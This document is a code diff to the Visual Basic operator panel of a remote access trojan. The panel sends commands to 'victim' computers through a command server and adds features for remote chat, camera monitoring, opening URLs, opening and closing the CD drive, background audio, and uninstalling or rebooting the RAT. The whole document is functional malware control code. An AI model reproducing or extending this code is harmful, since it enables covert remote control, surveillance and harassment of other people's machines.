@@ -7,6 +7,7 @@ Imports System.ComponentModel
 Public Class RatPanel
     Private mainWebClient As New WebClient()
     Private demandsClosing As Boolean = False
+
     Private Sub RatPanel_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
         ClientListManager.RunWorkerAsync()
@@ -112,21 +113,17 @@ Public Class RatPanel
 
         For Each _data In actionContent
             If _data.Contains(" ") Then _data = """" & _data & """"
-
             If contentNum = 1 Then
                 actionContentParsed &= "&actioncontent=" & _data
             Else
                 actionContentParsed &= "&actioncontent" & contentNum & "=" & _data
             End If
-
             contentNum += 1
         Next
 
         If MsgBox(message, MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
             For i = 0 To 5 ' Spam request to stub
-                mainWebClient.DownloadString(
-                    My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed
-                )
+                mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed)
                 System.Threading.Thread.Sleep(50)
             Next
         End If
@@ -162,9 +159,7 @@ Public Class RatPanel
         Dim form As New RemoteChat()
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
         form.Show()
-
-        mainWebClient.DownloadString(
-                My.Settings.vpsurl & "clients.php?action=senddata&target=" & form.targetIp & "&actiontype=openremotechat")
+        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & form.targetIp & "&actiontype=openremotechat")
     End Sub
     Private Sub CameraMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CameraMonitorToolStripMenuItem.Click
         ' TODO : add multiple window support
@@ -178,11 +173,35 @@ Public Class RatPanel
     Private Sub RATRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATRebootToolStripMenuItem.Click
         runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
     End Sub
-#End Region
+
     Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
         runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
     End Sub
 
+    Private Sub UserBlacklistToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UserBlacklistToolStripMenuItem.Click
+        Dim form As New Blacklist
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+
+    Private Sub CDOpenAndCloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CDOpenAndCloseToolStripMenuItem.Click
+        Dim form As New OpenCloseCD()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+
+    Private Sub OpenURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles OpenURLToolStripMenuItem1.Click
+        Dim form As New OpenURL()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub PlayMP3InBackgroundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlayMP3InBackgroundToolStripMenuItem.Click
+        Dim form As New MP3Player()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+
+#End Region
 #Region "UnspecificEvents"
     Private Sub BuildButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildButton.Click
         Dim saveFile As New SaveFileDialog
@@ -214,12 +233,17 @@ Public Class RatPanel
 
     Private Sub PingButton_Click(sender As Object, e As EventArgs) Handles PingButton.Click
         Dim pingThread As New Threading.Thread(Sub() Shell("cmd.exe /c ping " & My.Settings.vpsurl.Split("/")(2) & " -t",
-                AppWinStyle.NormalFocus, True))
+        AppWinStyle.NormalFocus, True))
         pingThread.Start()
+
     End Sub
 
     Private Sub Button1_Click(sender As Object, e As EventArgs)
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
+    End Sub
+
+    Private Sub LockVictimToolStripMenuItem_Click(sender As Object, e As EventArgs)
+
     End Sub
 
 #End Region
